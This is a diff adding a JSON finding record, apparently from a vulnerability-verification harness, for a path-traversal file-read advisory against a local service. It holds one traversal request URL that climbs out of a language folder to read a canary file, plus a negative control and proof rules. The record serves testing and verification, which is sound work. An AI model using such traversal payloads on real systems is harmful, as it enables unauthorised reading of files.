@@ -1,0 +1,29 @@
+{
+  "finding_id": "GHSA-hhgj-gg9h-rjp7",
+  "type": "path_traversal.file_read",
+  "target": {
+    "expected_origin": "http://127.0.0.1:6806",
+    "allowed_hosts": ["127.0.0.1"],
+    "allowed_schemes": ["http"],
+    "allowed_ports": [6806]
+  },
+  "auth": {
+    "required": false
+  },
+  "evidence": {
+    "request": {
+      "method": "GET",
+      "url": "http://127.0.0.1:6806/appearance/langs/../../../data/canary.json"
+    },
+    "vulnerable_parameter": "filepath",
+    "expected_markers": ["NOCAPSEC_CANARY_8f3a1c"],
+    "negative_control": {
+      "method": "GET",
+      "url": "http://127.0.0.1:6806/appearance/langs/en_US.json"
+    }
+  },
+  "proof": {
+    "require_marker": true,
+    "require_negative_control_absent": true
+  }
+}
